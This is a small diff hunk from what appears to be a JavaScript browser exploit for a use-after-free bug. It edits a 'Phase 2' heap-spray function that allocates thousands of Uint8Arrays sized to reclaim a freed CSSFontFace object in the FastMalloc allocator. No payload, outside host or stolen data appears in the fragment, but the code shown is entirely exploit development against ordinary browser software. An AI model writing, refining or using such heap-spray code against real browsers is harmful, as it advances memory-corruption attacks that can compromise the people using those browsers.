@@ -123,7 +123,7 @@ let uaf_arrays = [];
 
 function directOverlapSpray() {
     log("[*] Phase 2: Spraying Uint8Arrays to overlap freed CSSFontFace...");
-    for (let i = 0; i < 20000; i++) {
+    for (let i = 0; i < 2000; i++) {
         // Create typed arrays that map to the exact size of the freed object in FastMalloc
         let arr = new Uint8Array(RECLAIM_SIZE);
         
